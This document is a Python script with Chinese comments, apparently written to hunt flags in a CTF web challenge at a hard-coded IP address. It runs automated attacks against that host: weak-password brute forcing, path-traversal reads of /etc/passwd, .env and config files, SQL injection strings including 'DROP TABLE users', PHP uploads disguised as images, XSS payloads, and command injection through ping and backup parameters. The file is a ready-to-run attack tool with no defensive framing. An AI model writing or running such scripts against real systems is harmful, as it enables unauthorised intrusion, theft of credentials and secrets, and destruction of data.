import requests
import re
import base64
import html
import json

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

session = requests.Session()
session.verify = False
session.headers.update(HEADERS)

FLAGS_FOUND = []


def add_flag(location, content, method=""):
    FLAGS_FOUND.append({"location": location, "content": content, "method": method})
    print(f"\n  🚩 发现FLAG! [{method}]")
    print(f"     位置: {location}")
    print(f"     内容: {content}")


def check_flag_pattern(text):
    patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'f[l1]ag\{[^}]+\}',
        r'key\{[^}]+\}',
        r'secret\{[^}]+\}',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            return match
    return None


def decode_and_check(text):
    flag = check_flag_pattern(text)
    if flag:
        return flag, "明文"
    
    try:
        b64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', text)
        for b64 in b64_patterns:
            try:
                decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                flag = check_flag_pattern(decoded)
                if flag:
                    return flag, "Base64解码"
            except:
                pass
    except:
        pass
    
    return None, None


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_login():
    """测试弱口令登录"""
    print_section("1. AUTH - 弱口令测试")
    
    url = f"{TARGET}/login"
    
    try:
        r = session.get(url, timeout=TIMEOUT)
        print(f"  登录页面状态: {r.status_code}")
        
        # 提取表单
        csrf_token = re.search(r'csrf_token["\']\s*[:=]\s*["\']([^"\']+)["\']', r.text)
        csrf_value = csrf_token.group(1) if csrf_token else ""
        print(f"  CSRF Token: {'已找到' if csrf_value else '未找到'}")
        
        # 常见弱口令
        credentials = [
            ("admin", "admin"),
            ("admin", "admin123"),
            ("admin", "123456"),
            ("admin", "password"),
            ("root", "root"),
            ("root", "password"),
            ("test", "test"),
            ("user", "user"),
            ("admin", ""),
            ("", ""),
            ("admin", "admin888"),
            ("admin", "12345678"),
            ("admin", "000000"),
            ("admin", "888888"),
            ("guest", "guest"),
            ("admin", "abc123"),
            ("admin", "welcome"),
            ("admin", "changeme"),
        ]
        
        print(f"\n  测试 {len(credentials)} 组弱口令...")
        
        for username, password in credentials:
            try:
                data = {
                    "username": username,
                    "password": password,
                }
                if csrf_value:
                    data["csrf_token"] = csrf_value
                
                r = session.post(url, data=data, timeout=TIMEOUT)
                
                if r.status_code == 302 or "dashboard" in r.text.lower() or "welcome" in r.text.lower():
                    print(f"\n  ⚠️  可能成功: {username}/{password}")
                    print(f"     状态码: {r.status_code}")
                    if r.status_code == 302:
                        print(f"     跳转: {r.headers.get('Location', '')}")
                elif r.status_code == 200 and len(r.text) < 500:
                    print(f"     [{r.status_code}] {username}/{password}")
                    
                    flag, method = decode_and_check(r.text)
                    if flag:
                        add_flag(f"登录响应: {username}/{password}", flag, method)
                        
            except Exception as e:
                pass
                
    except Exception as e:
        print(f"  错误: {e}")


def test_lfi():
    """测试文件包含"""
    print_section("2. LFI - 文件包含测试")
    
    url = f"{TARGET}/include"
    
    # 白名单页面
    whitelist_pages = ["welcome"]
    
    # 尝试路径遍历
    lfi_payloads = [
        "welcome",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../etc/passwd",
        "/etc/passwd",
        "../../etc/passwd%00",
        "../../etc/passwd%00welcome",
        "welcome.php",
        "welcome/../etc/passwd",
        "../flag",
        "../../flag",
        "../flag.txt",
        "../../flag.txt",
        "/flag",
        "/flag.txt",
        "../secret",
        "../../secret",
        "../secret.txt",
        "../../secret.txt",
        "../var/www/html/flag",
        "../../var/www/html/flag",
        "../app.py",
        "../../app.py",
        "../config.py",
        "../../config.py",
        "../.env",
        "../../.env",
    ]
    
    for payload in lfi_payloads:
        try:
            r = session.get(url, params={"page": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200 and len(r.text) > 0:
                content = r.text[:300]
                
                # 检查是否有敏感内容
                sensitive_keywords = ["root:", "flag", "secret", "password", "admin"]
                has_sensitive = any(k in content.lower() for k in sensitive_keywords)
                
                if has_sensitive or len(r.text) > 500:
                    print(f"\n  [{r.status_code}] ?page={payload}")
                    print(f"     内容: {content}")
                    
                    flag, method = decode_and_check(r.text)
                    if flag:
                        add_flag(f"LFI: {payload}", flag, method)
                        
        except:
            pass


def test_sql_injection():
    """测试SQL注入"""
    print_section("3. SQL - SQL注入测试")
    
    url = f"{TARGET}/search"
    
    sql_payloads = [
        "SQL",
        "1' OR 1=1--",
        "1' OR '1'='1",
        "1' UNION SELECT 1,2,3--",
        "1' UNION SELECT 1,version(),database()--",
        "1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--",
        "1' AND SLEEP(1)--",
        "' OR 1=1",
        "\" OR 1=1",
        "'; DROP TABLE users--",
        "1' UNION SELECT 1,load_file('/etc/passwd'),3--",
        "*",
        "%",
        "admin",
        "flag",
        "' or 1=1#",
        "' or 'a'='a",
    ]
    
    for payload in sql_payloads:
        try:
            r = session.get(url, params={"q": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text[:200]
                
                # 检查SQL错误
                sql_errors = ["SQL syntax", "mysql", "MySQL", "database", "error", "Warning"]
                has_error = any(e in content for e in sql_errors)
                
                if has_error or len(r.text) > 500:
                    print(f"\n  [{r.status_code}] ?q={payload}")
                    print(f"     内容: {content}")
                    
                    flag, method = decode_and_check(r.text)
                    if flag:
                        add_flag(f"SQL注入: {payload}", flag, method)
                        
        except:
            pass


def test_file_upload():
    """测试文件上传"""
    print_section("4. FILE - 文件上传测试")
    
    url = f"{TARGET}/upload"
    
    try:
        r = session.get(url, timeout=TIMEOUT)
        print(f"  上传页面状态: {r.status_code}")
        
        # 检查页面内容
        if "upload" in r.text.lower() or "图片" in r.text:
            print(f"  页面内容: {r.text[:300]}")
        
        # 尝试上传不同类型文件
        test_files = [
            ("test.txt", "text/plain", "Hello World"),
            ("test.png", "image/png", b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x10\x00\x00\x00\x10\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x04sBIT\x08\x08\x08\x08|\x88|\x88l\x88l\x88\x00\x00\x00\x1dIDATx\x9c\xed\xc1\x01\r\x00\x00\x00\xc2\xa0\xf7\xfd\xff?\xff\x00\x00\x00\x05\xff\x00\xff\x00\xff\x00\xff\x00\x00\x00\x00IEND\xaeB`\x82'),
            ("test.php", "application/php", "<?php echo 'test'; ?>"),
            ("test.php.png", "image/png", b'<?php echo \"test\"; ?>'),
            ("test.png.php", "image/png", b'\x89PNG<?php echo \"test\"; ?>'),
            ("test.jpg", "image/jpeg", b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09'),
        ]
        
        for filename, content_type, content in test_files:
            try:
                files = {"file": (filename, content, content_type)}
                r = session.post(url, files=files, timeout=TIMEOUT)
                
                print(f"\n  [{r.status_code}] 上传 {filename}")
                
                if r.status_code == 200:
                    print(f"     响应: {r.text[:200]}")
                    
                    flag, method = decode_and_check(r.text)
                    if flag:
                        add_flag(f"文件上传: {filename}", flag, method)
                        
            except Exception as e:
                print(f"     错误: {e}")
                
    except Exception as e:
        print(f"  错误: {e}")


def test_xss():
    """测试XSS"""
    print_section("5. XSS - 存储型XSS测试")
    
    url = f"{TARGET}/message"
    
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "<div onmouseover=alert(1)>hover</div>",
        "\"><script>alert(1)</script>",
        "flag",
        "CTF",
        "<script>console.log('test')</script>",
    ]
    
    for payload in xss_payloads:
        try:
            r = session.post(url, data={"message": payload}, timeout=TIMEOUT)
            
            if r.status_code in [200, 201]:
                print(f"\n  [{r.status_code}] XSS: {payload[:50]}")
                
                flag, method = decode_and_check(r.text)
                if flag:
                    add_flag(f"XSS响应: {payload}", flag, method)
                    
        except:
            pass


def test_command_execution():
    """测试命令执行"""
    print_section("6. CMD - 命令执行测试")
    
    # /ping 测试
    print("\n  --- /ping 网络诊断 ---")
    ping_url = f"{TARGET}/ping"
    
    ping_payloads = [
        "127.0.0.1",
        "127.0.0.1; ls",
        "127.0.0.1; cat /etc/passwd",
        "127.0.0.1 && ls",
        "127.0.0.1 | ls",
        "127.0.0.1 || ls",
        "; ls",
        "&& ls",
        "| ls",
        "127.0.0.1; cat /flag",
        "127.0.0.1; cat flag.txt",
        "127.0.0.1; whoami",
        "127.0.0.1; id",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200 and len(r.text) > 0:
                content = r.text[:300]
                
                # 检查命令执行迹象
                if any(k in content for k in ["root:", "flag", "uid=", "gid=", "bin", "usr"]):
                    print(f"\n  [{r.status_code}] ?host={payload}")
                    print(f"     响应: {content}")
                    
                    flag, method = decode_and_check(r.text)
                    if flag:
                        add_flag(f"Ping命令执行: {payload}", flag, method)
                        
        except:
            pass
    
    # /backup 测试
    print("\n  --- /backup 备份预览 ---")
    backup_url = f"{TARGET}/backup"
    
    backup_payloads = [
        "test",
        "127.0.0.1",
        "/etc/passwd",
        "/flag",
        "/flag.txt",
        "../flag",
        "../../flag",
        "; ls",
        "; cat /flag",
        "; cat /etc/passwd",
        "| ls",
        "| cat /flag",
        "&& cat /flag",
        "`ls`",
        "`cat /flag`",
        "$(ls)",
        "$(cat /flag)",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(backup_url, params={"file": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200 and len(r.text) > 0:
                content = r.text[:300]
                
                if any(k in content for k in ["root:", "flag", "uid=", "gid=", "bin", "usr"]):
                    print(f"\n  [{r.status_code}] ?file={payload}")
                    print(f"     响应: {content}")
                    
                    flag, method = decode_and_check(r.text)
                    if flag:
                        add_flag(f"Backup命令执行: {payload}", flag, method)
                        
        except:
            pass


def test_dashboard():
    """测试控制台"""
    print_section("7. Dashboard - 控制台测试")
    
    url = f"{TARGET}/dashboard"
    
    try:
        r = session.get(url, timeout=TIMEOUT)
        print(f"  状态码: {r.status_code}")
        
        if r.status_code == 200:
            print(f"  内容: {r.text[:500]}")
            
            flag, method = decode_and_check(r.text)
            if flag:
                add_flag("Dashboard", flag, method)
                
    except Exception as e:
        print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF FLAG 搜索 - 全面测试版")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_login()
    test_lfi()
    test_sql_injection()
    test_file_upload()
    test_xss()
    test_command_execution()
    test_dashboard()
    
    print_section("检测结果汇总")
    
    if FLAGS_FOUND:
        print(f"\n  🎉 共发现 {len(FLAGS_FOUND)} 个FLAG!")
        for i, flag_info in enumerate(FLAGS_FOUND):
            print(f"\n  [{i+1}] {flag_info['method']}")
            print(f"      位置: {flag_info['location']}")
            print(f"      FLAG: {flag_info['content']}")
    else:
        print("\n  ❌ 未发现FLAG")
        print("\n  CTF模块总结:")
        print("     - /login: 弱口令登录")
        print("     - /include?page=welcome: 文件包含")
        print("     - /search?q=SQL: SQL注入")
        print("     - /upload: 文件上传")
        print("     - /message: 存储型XSS")
        print("     - /ping: 命令执行")
        print("     - /backup: 命令执行")
        print("\n  建议:")
        print("     1. 使用浏览器手动测试这些模块")
        print("     2. 先尝试弱口令登录后台")
        print("     3. 测试文件包含漏洞读取敏感文件")
        print("     4. 测试命令执行漏洞")
    
    print()


if __name__ == "__main__":
    main()